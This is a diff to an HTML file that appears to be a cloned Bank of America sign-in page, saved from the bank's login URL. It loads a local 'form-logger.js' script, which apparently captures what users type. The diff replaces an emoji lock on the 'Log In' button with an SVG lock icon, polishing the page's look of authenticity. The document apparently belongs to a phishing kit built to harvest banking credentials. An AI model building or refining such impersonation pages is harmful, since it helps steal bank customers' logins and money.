@@ -2,11 +2,12 @@
 <!-- saved from url=(0064)https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go -->
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-149 webkit svg-bg not-retina cf-cnx-regular-active"><head><script src="./assets/js/form-logger.js" type="text/javascript" charset="utf-8"></script><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style>body {transition: opacity ease-in 0.2s; } 
 body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
-.btn-bofa-blue-lock::before {
-  content: '🔒 ';
-  font-size: 0.95em;
-  margin-right: 4px;
-  font-weight: normal;
+.lock-icon {
+  display: inline-block;
+  vertical-align: middle;
+  margin-right: 5px;
+  width: 16px;
+  height: 16px;
 }
 </style><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style>
 
@@ -553,7 +554,7 @@ border: 0 !important;
 			
 					<a href="./login-reset.html" class="fl-lt forgot-passcode" name="forgot-your-passcode">Forgot your Password?</a>
 			<div class="clearboth"></div>
-			<a href="javascript:void(0);" id="login_button" onclick="enterOnlineIDFormSubmit();" role="button" title="Log In" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight" name="enter-online-id-submit"><span class="btn-bofa-blue-lock">Log In</span></a>
+			<a href="javascript:void(0);" id="login_button" onclick="enterOnlineIDFormSubmit();" role="button" title="Log In" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight" name="enter-online-id-submit"><span class="btn-bofa-blue-lock"><svg class="lock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>Log In</span></a>
 		
 			<a href="javascript:void(0);" id="signin-mobile-app" name="signin-mobile-app" class="displayNone">Log In with mobile app</a>
 
